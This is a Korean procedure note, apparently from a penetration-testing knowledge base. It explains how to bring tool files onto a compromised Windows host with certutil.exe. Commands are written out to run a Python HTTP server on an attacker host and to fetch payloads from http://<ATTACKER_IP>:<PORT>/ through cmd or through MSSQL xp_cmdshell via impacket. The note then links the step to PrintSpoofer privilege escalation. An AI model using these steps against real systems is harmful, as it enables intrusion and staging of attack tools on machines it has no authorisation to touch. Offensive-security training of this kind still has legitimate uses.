---
tags:
  - 환경/windows
  - 서비스/http
문서역할: 수동절차
시작조건: ["Windows 명령 실행", "공격 호스트 HTTP 포트로 outbound 연결 가능"]
필요권한: ["대상 저장 경로 쓰기 권한"]
필요조건: ["certutil.exe 사용 가능", "공격 호스트의 원본 파일과 HTTP 수신 주소"]
결과: ["Windows 대상의 도구 파일"]
---

# Certutil로 Windows HTTP 파일 반입

## 한 줄 판단

Windows 대상에서 명령을 실행하고 공격 호스트의 HTTP 포트에 연결할 수 있다면, `certutil.exe`로 원본 파일을 쓰기 가능한 경로에 내려받고 크기와 SHA-256을 비교해 정상 반입을 확인한다.

## 사용할 때

- 일반 Windows 셸이나 `xp_cmdshell`에서 HTTP로 실행 파일·스크립트를 반입할 때.
- PowerShell 다운로드가 제한되지만 `certutil.exe`를 사용할 수 있을 때.
- 전송 성공과 파일 실행 성공을 분리해 확인해야 할 때.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 공격 호스트 listener | 대상이 도달할 주소·포트에서 HTTP 수신 | 서버 시작 출력과 수신 포트 | bind 주소·VPN 인터페이스·방화벽 확인 |
| 대상 네트워크 | Windows 대상에서 HTTP 포트 연결 가능 | 실제 다운로드 요청 | DNS 대신 도달 가능한 IP와 egress 포트 확인 |
| 대상 경로 | 현재 실행 계정의 쓰기 권한 | 파일 생성·삭제 확인 | 사용자 Temp 등 다른 경로 선택 |
| 원본 무결성 | 원본 크기와 SHA-256 기록 | `sha256sum` | 원본 파일을 다시 준비 |

## 실행

### Linux 공격 호스트에서 HTTP 서버 실행

```bash
cd <SERVE_DIRECTORY>
sha256sum <SOURCE_FILE>
ss -ltnp 'sport = :<PORT>'
python3 -m http.server <PORT> --bind <ATTACKER_IP> &
HTTP_SERVER_PID=$!
ps -p "$HTTP_SERVER_PID" -o pid,cmd
```

실행 전 포트가 비어 있어야 하며, 이후 정리에는 이때 기록한 `<HTTP_SERVER_PID>`만 사용한다.

### 일반 Windows 셸에서 다운로드

```cmd
if exist "<DESTINATION_FILE>" echo DESTINATION_EXISTS
certutil.exe -urlcache
certutil.exe -f -urlcache -split http://<ATTACKER_IP>:<PORT>/<SOURCE_FILE> <DESTINATION_FILE>
certutil.exe -hashfile <DESTINATION_FILE> SHA256
```

`DESTINATION_EXISTS`가 출력되면 여기서 멈추고 새 목적지 이름을 정한다. 실행 전 `-urlcache` 출력에 같은 URL이 있으면 기존 cache 항목과 구분할 수 있도록 HTTP 제공 파일명도 바꾼다. `-f`는 기존 파일을 덮어쓰는 용도로 사용하지 않는다.

### impacket-mssqlclient의 xp_cmdshell에서 다운로드

```text
SQL> xp_cmdshell if exist "<DESTINATION_FILE>" echo DESTINATION_EXISTS
SQL> xp_cmdshell certutil.exe -urlcache
SQL> xp_cmdshell certutil.exe -f -urlcache -split http://<ATTACKER_IP>:<PORT>/<SOURCE_FILE> "<DESTINATION_FILE>"
SQL> xp_cmdshell certutil.exe -hashfile "<DESTINATION_FILE>" SHA256
```

`DESTINATION_EXISTS`가 출력되거나 같은 URL cache 항목이 보이면 일반 Windows 셸과 같은 기준으로 새 경로·URL을 정한 뒤 다운로드한다.

확인할 출력:

- 공격 호스트 HTTP 로그에 `GET /<SOURCE_FILE>`이 표시된다.
- Windows에서 `CertUtil: -URLCache command completed successfully`와 대상 파일이 확인된다.
- 송신 전후 SHA-256이 일치해야 정상 반입이다.
- 연결 오류는 HTTP listener·주소·포트 단계부터, 파일 생성 오류는 대상 경로 ACL부터 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| HTTP GET, 파일 생성과 SHA-256 일치 | 파일 반입 완료 | Windows 대상의 검증된 도구 파일 | 원래 사용하려던 공격기법으로 돌아가 파일 실행 |
| HTTP GET이 없음 | 대상에서 listener까지 연결 실패 | 파일 미반입 | bind 주소·route·방화벽·egress 포트 확인 |
| 다운로드 성공 메시지는 있으나 hash 불일치 | 전송 파일 변형·잘못된 원본 | 손상된 파일 | 실행하지 말고 원본 URL과 파일을 다시 확인 |
| 파일은 정상이나 실행 거부 | 반입과 실행 정책은 별개 | 파일 반입만 완료 | arch·ACL·AppLocker·AV 차단 단계 확인 |

## 확인할 출력과 권한

- HTTP GET은 요청 도달, `command completed successfully`는 다운로드 명령 완료, SHA-256 일치는 정상 파일 반입을 각각 입증한다.
- 파일이 존재해도 실행 권한이나 권한 상승 성공은 별도 기법에서 확인한다.

## 변경 영향과 복구

대상 파일을 사용하는 process가 있다면 먼저 그 기법의 PID 기준 종료 절차를 수행한다. 그 뒤 이번 실행에서 만든 exact 파일과 URL cache 항목, 공격 호스트의 HTTP listener를 다음 순서로 정리한다.

| 변경 대상 | 기존 상태·식별값 | 복구 절차 | 완료 확인 |
|---|---|---|---|
| 대상 저장 파일 | 실행 전 `if exist` 결과가 없음, `<DESTINATION_FILE>`과 SHA-256 | Windows 대상에서 `del "<DESTINATION_FILE>"` | `if exist "<DESTINATION_FILE>" echo FILE_STILL_EXISTS`가 출력되지 않음 |
| URL cache 항목 | 실행 전 목록에 없던 exact `http://<ATTACKER_IP>:<PORT>/<SOURCE_FILE>` | Windows 대상에서 `certutil.exe -urlcache http://<ATTACKER_IP>:<PORT>/<SOURCE_FILE> delete` | `certutil.exe -urlcache`에 기록한 URL이 없음 |
| HTTP listener | 실행 전 포트 상태, `<HTTP_SERVER_PID>`와 command line | 대상 파일과 cache 정리 확인 뒤 Linux 공격 호스트에서 `kill <HTTP_SERVER_PID>` | `ps -p <HTTP_SERVER_PID>`에 process가 없고 `ss -ltnp 'sport = :<PORT>'`에 이번 PID가 없음 |

기존 대상 파일이나 cache URL이 있었다면 이 절차로 덮어쓰거나 삭제하지 않는다. listener 종료가 실패하면 PID와 command line을 다시 대조하고 모든 Python process를 이름으로 종료하지 않는다.

## 관련 공격기법

- [[제한 환경 파일 반입]]
- [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]]

## 관련 상태 라우터

- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- [[MSSQL 인증 세션 확보 후 권한과 실행 경로 선택]]

## 참고 링크

- [Microsoft Learn: certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
